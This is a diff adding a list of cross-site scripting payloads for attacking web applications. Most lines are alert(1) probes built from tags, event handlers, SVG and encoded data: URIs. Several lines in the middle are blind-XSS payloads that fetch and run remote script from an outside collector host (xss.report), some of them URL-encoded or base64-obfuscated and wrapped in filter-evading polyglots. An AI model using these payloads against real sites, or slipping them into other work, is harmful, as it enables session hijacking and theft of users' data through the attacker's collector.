@@ -1,0 +1,37 @@
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<math href="javascript:alert(1)">CLICK</math>
+<video><source onerror="alert(1)">
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<isindex action=javascript:alert(1)>
+<base href="javascript://"><script>alert(1)</script>
+<embed src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">
+<svg><a xlink:href="javascript:alert(1)">CLICK</a></svg>
+"><style>@keyframes x{}</style><svg onload=alert(1)>
+<script/src=data:text/javascript,alert(1)>
+"><script src=//0x7f.0x0/alert(1)></script>
+"><object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><iframe src=javascript:alert(1)></iframe></foreignObject></svg>
+<svg><script xlink:href="data:image/svg+xml,%3Cscript%3Ealert(1)%3C/script%3E"></script></svg>
+"><input autofocus onfocus=alert(1)>
+'"><script src=https://xss.report/c/flamie></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/flamie\';document.body.appendChild(a)')
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=(import(/https:\xss.report\c\flamie/.source))//>
+%3Cbody%20onload=%22var%20a=document.createElement('script');a.src='https://xss.report/c/flamie';document.body.appendChild(a)%22%3E
+%22%3E%3Cimg%20src=x%20id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2ZsYW1pZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;%20onerror=eval(atob(this.id))%3E
+javascript:%22/*'/*%60/*--%3E%3C/noscript%3E%3C/title%3E%3C/textarea%3E%3C/style%3E%3C/template%3E%3C/noembed%3E%3C/script%3E%3Chtml%20%22%20onmouseover=/*&lt;svg/*/onload=(import(/https:%5Cxss.report%5Cc%5Cflamie/.source))//%3E
+%3Cscript%3Efetch(%22//xss.report/c/flamie%22).then(r=%3Er.text()).then(t=%3Eeval(t))%3C/script%3E
+var%20a=document.createElement(%22script%22);a.src=%22https://xss.report/c/flamie%22;document.body.appendChild(a);
+'%22%3E%3Cscript%20src=https://xss.report/c/flamie%3E%3C/script%3E
+"><form><button formaction="javascript:alert(1)">X</button></form>
+"><button formaction="javascript:alert(1)">CLICK</button>
+<svg xmlns="http://www.w3.org/2000/svg"><script href="data:,alert(1)"/>
+"><script id="xss">eval(atob('YWxlcnQoMSk='))</script>
+<iframe srcdoc="<script>alert(1)</script>">
+<svg><animate attributeName="href" values="javascript:alert(1)" />
